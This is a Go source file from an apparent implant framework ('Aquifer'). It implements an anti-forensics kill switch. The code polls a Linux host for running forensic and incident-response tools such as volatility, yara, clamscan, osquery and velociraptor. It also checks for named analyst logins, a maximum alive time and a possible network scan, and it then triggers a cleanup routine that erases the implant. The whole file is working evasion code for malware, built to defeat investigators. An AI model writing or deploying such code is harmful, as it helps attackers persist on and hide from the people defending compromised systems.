package opsec

import (
	"bufio"
	"fmt"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/Real-Fruit-Snacks/Aquifer/pkg/config"
)

// forensicTools lists process names associated with forensic analysis
// and incident response that should trigger the kill switch.
var forensicTools = []string{
	"volatility",
	"volatility3",
	"rekall",
	"lime",
	"dc3dd",
	"bulk_extractor",
	"autopsy",
	"foremost",
	"sleuthkit",
	"tsk_recover",
	"yara",
	"clamav",
	"clamscan",
	"rkhunter",
	"chkrootkit",
	"osquery",
	"osqueryd",
	"velociraptor",
	"sysdig",
}

// KillSwitch monitors the system for forensic analysis indicators and
// triggers a cleanup function when conditions are met. It runs as a
// background goroutine that periodically checks for trigger conditions.
type KillSwitch struct {
	cfg         *config.ImplantConfig
	cleanupFn   func()
	interval    time.Duration
	startTime   time.Time
	done        chan struct{}
	once        sync.Once
	startOnce   sync.Once
	cleanupOnce sync.Once
	mu          sync.Mutex
	lastLog     string // in-memory only log of trigger reason
}

// NewKillSwitch creates a new KillSwitch with the given configuration and
// cleanup function. The cleanup function is called exactly once when a
// trigger condition is met.
func NewKillSwitch(cfg *config.ImplantConfig, cleanupFn func()) *KillSwitch {
	interval := 30 * time.Second
	if cfg.CallbackInterval > 0 {
		// Check at roughly the same cadence as callbacks, but no slower
		// than every 60 seconds.
		interval = cfg.CallbackInterval
		if interval > 60*time.Second {
			interval = 60 * time.Second
		}
	}

	return &KillSwitch{
		cfg:       cfg,
		cleanupFn: cleanupFn,
		interval:  interval,
		startTime: time.Now(),
		done:      make(chan struct{}),
	}
}

// Start begins the kill switch monitoring goroutine. It checks trigger
// conditions at the configured interval and fires the cleanup function
// if any condition is met.
func (ks *KillSwitch) Start() {
	ks.startOnce.Do(func() {
		go ks.monitor()
	})
}

// Stop gracefully stops the monitoring goroutine. It is safe to call
// multiple times.
func (ks *KillSwitch) Stop() {
	ks.once.Do(func() {
		close(ks.done)
	})
}

// TriggerReason returns the reason the kill switch was last triggered,
// or empty string if it hasn't triggered. This is stored in memory only.
func (ks *KillSwitch) TriggerReason() string {
	ks.mu.Lock()
	defer ks.mu.Unlock()
	return ks.lastLog
}

// monitor is the main monitoring loop that runs in a goroutine.
func (ks *KillSwitch) monitor() {
	ticker := time.NewTicker(ks.interval)
	defer ticker.Stop()

	for {
		select {
		case <-ks.done:
			return
		case <-ticker.C:
			if reason := ks.checkConditions(); reason != "" {
				ks.mu.Lock()
				ks.lastLog = fmt.Sprintf("[%s] killswitch triggered: %s",
					time.Now().UTC().Format(time.RFC3339), reason)
				ks.mu.Unlock()

				// Fire cleanup exactly once, then stop monitoring.
				ks.cleanupOnce.Do(func() {
					if ks.cleanupFn != nil {
						ks.cleanupFn()
					}
				})
				return
			}
		}
	}
}

// checkConditions evaluates all trigger conditions and returns the reason
// string if any condition is met, or empty string otherwise.
func (ks *KillSwitch) checkConditions() string {
	if reason := ks.checkTimeLimit(); reason != "" {
		return reason
	}

	if reason := ks.checkUsers(); reason != "" {
		return reason
	}

	if reason := ks.checkProcesses(); reason != "" {
		return reason
	}

	if reason := ks.checkNetworkAnomaly(); reason != "" {
		return reason
	}

	return ""
}

// checkTimeLimit triggers if the implant has been alive longer than
// MaxAliveHours. A value of 0 means no time limit.
func (ks *KillSwitch) checkTimeLimit() string {
	if ks.cfg.MaxAliveHours <= 0 {
		return ""
	}

	maxDuration := time.Duration(ks.cfg.MaxAliveHours) * time.Hour
	if time.Since(ks.startTime) > maxDuration {
		return fmt.Sprintf("max alive time exceeded (%d hours)", ks.cfg.MaxAliveHours)
	}

	return ""
}

// checkUsers parses the output of utmp (via /var/run/utmp) or falls back
// to /proc-based detection to find logged-in users that match the
// KillSwitchUsers list (e.g., forensic analyst accounts).
func (ks *KillSwitch) checkUsers() string {
	if len(ks.cfg.KillSwitchUsers) == 0 {
		return ""
	}

	// Build a set of trigger usernames for fast lookup.
	triggerUsers := make(map[string]bool, len(ks.cfg.KillSwitchUsers))
	for _, u := range ks.cfg.KillSwitchUsers {
		triggerUsers[strings.ToLower(u)] = true
	}

	// Strategy 1: Read /var/run/utmp for logged-in users.
	// utmp is a binary format; instead, parse /proc/[pid]/loginuid and
	// /etc/passwd to map UIDs to usernames, or read who-style info
	// from /var/run/utmp via a simpler heuristic.

	// Strategy 2: Scan /proc for processes owned by trigger users.
	// This is more reliable than utmp parsing in Go.
	loggedInUsers := getLoggedInUsers()
	for _, user := range loggedInUsers {
		if triggerUsers[strings.ToLower(user)] {
			return fmt.Sprintf("trigger user logged in: %s", user)
		}
	}

	return ""
}

// getLoggedInUsers returns a list of currently logged-in usernames by
// reading /var/run/utmp entries or falling back to scanning /proc.
func getLoggedInUsers() []string {
	users := make(map[string]bool)

	// Try reading utmp-style data from /var/run/utmp.
	// The utmp file has fixed-size records; we look for UT_USER_PROCESS (7).
	// Each record is 384 bytes on x86_64 Linux.
	utmpData, err := os.ReadFile("/var/run/utmp")
	if err == nil && len(utmpData) > 0 {
		const utmpRecordSize = 384
		const utTypeOffset = 0
		const utUserOffset = 44
		const utUserLen = 32
		const utUserProcess = 7

		for i := 0; i+utmpRecordSize <= len(utmpData); i += utmpRecordSize {
			record := utmpData[i : i+utmpRecordSize]

			// ut_type is a 32-bit int at offset 0.
			utType := int32(record[utTypeOffset]) |
				int32(record[utTypeOffset+1])<<8 |
				int32(record[utTypeOffset+2])<<16 |
				int32(record[utTypeOffset+3])<<24

			if utType != utUserProcess {
				continue
			}

			// Extract username (null-terminated within 32-byte field at offset 44).
			userBytes := record[utUserOffset : utUserOffset+utUserLen]
			nullIdx := 0
			for nullIdx < len(userBytes) && userBytes[nullIdx] != 0 {
				nullIdx++
			}
			if nullIdx > 0 {
				users[string(userBytes[:nullIdx])] = true
			}
		}
	}

	// Fallback: scan /proc for unique UIDs and resolve to usernames.
	if len(users) == 0 {
		entries, err := os.ReadDir("/proc")
		if err != nil {
			return nil
		}

		uidSet := make(map[string]bool)
		for _, entry := range entries {
			if !entry.IsDir() {
				continue
			}
			// Only look at numeric directories (PIDs).
			if _, err := strconv.Atoi(entry.Name()); err != nil {
				continue
			}

			statusPath := filepath.Join("/proc", entry.Name(), "status")
			f, err := os.Open(statusPath)
			if err != nil {
				continue
			}

			scanner := bufio.NewScanner(f)
			for scanner.Scan() {
				line := scanner.Text()
				if strings.HasPrefix(line, "Uid:") {
					fields := strings.Fields(line)
					if len(fields) >= 2 {
						uidSet[fields[1]] = true
					}
					break
				}
			}
			f.Close()
		}

		// Resolve UIDs to usernames via /etc/passwd.
		userMap := parsePasswd()
		for uid := range uidSet {
			if name, ok := userMap[uid]; ok {
				users[name] = true
			}
		}
	}

	result := make([]string, 0, len(users))
	for u := range users {
		result = append(result, u)
	}
	return result
}

// parsePasswd reads /etc/passwd and returns a map of UID string to username.
func parsePasswd() map[string]string {
	result := make(map[string]string)

	f, err := os.Open("/etc/passwd")
	if err != nil {
		return result
	}
	defer f.Close()

	scanner := bufio.NewScanner(f)
	for scanner.Scan() {
		line := scanner.Text()
		if strings.HasPrefix(line, "#") {
			continue
		}
		fields := strings.Split(line, ":")
		if len(fields) >= 3 {
			result[fields[2]] = fields[0] // UID -> username
		}
	}

	return result
}

// checkProcesses scans /proc for running processes that match known forensic
// and incident response tools. Checks both the configured KillSwitchProcs
// and the built-in forensicTools list.
func (ks *KillSwitch) checkProcesses() string {
	// Merge configured and built-in tool lists.
	toolSet := make(map[string]bool)
	for _, t := range forensicTools {
		toolSet[strings.ToLower(t)] = true
	}
	for _, t := range ks.cfg.KillSwitchProcs {
		toolSet[strings.ToLower(t)] = true
	}

	entries, err := os.ReadDir("/proc")
	if err != nil {
		return ""
	}

	for _, entry := range entries {
		if !entry.IsDir() {
			continue
		}
		if _, err := strconv.Atoi(entry.Name()); err != nil {
			continue
		}

		commPath := filepath.Join("/proc", entry.Name(), "comm")
		comm, err := os.ReadFile(commPath)
		if err != nil {
			continue
		}

		procName := strings.ToLower(strings.TrimSpace(string(comm)))
		if toolSet[procName] {
			return fmt.Sprintf("forensic tool detected: %s (pid %s)", procName, entry.Name())
		}
	}

	return ""
}

// checkNetworkAnomaly detects if the implant is being actively port-scanned
// by checking for an abnormal number of connections in various states to
// common ports. This indicates a network forensic investigation.
func (ks *KillSwitch) checkNetworkAnomaly() string {
	// Read /proc/net/tcp for IPv4 TCP connections.
	// Each line has: local_address remote_address st ...
	// Connection states: 01=ESTABLISHED, 0A=LISTEN, etc.
	// High SYN_RECV (03) count indicates scanning.
	f, err := os.Open("/proc/net/tcp")
	if err != nil {
		return ""
	}
	defer f.Close()

	scanner := bufio.NewScanner(f)
	synRecvCount := 0
	totalConns := 0

	// Skip the header line.
	if scanner.Scan() {
		// discard header
	}

	for scanner.Scan() {
		line := scanner.Text()
		fields := strings.Fields(line)
		if len(fields) < 4 {
			continue
		}

		totalConns++
		state := fields[3]

		// 03 = SYN_RECV: indicates incoming connection attempts.
		if state == "03" {
			synRecvCount++
		}
	}

	// Heuristic: if we see many SYN_RECV connections, we are likely
	// being scanned. Threshold is deliberately conservative.
	if synRecvCount > 50 {
		return fmt.Sprintf("network anomaly: %d SYN_RECV connections detected (possible scan)", synRecvCount)
	}

	// Also flag if there is an unusual total connection count, which
	// might indicate connection flooding or enumeration.
	if totalConns > 500 {
		return fmt.Sprintf("network anomaly: %d total TCP connections (possible enumeration)", totalConns)
	}

	return ""
}
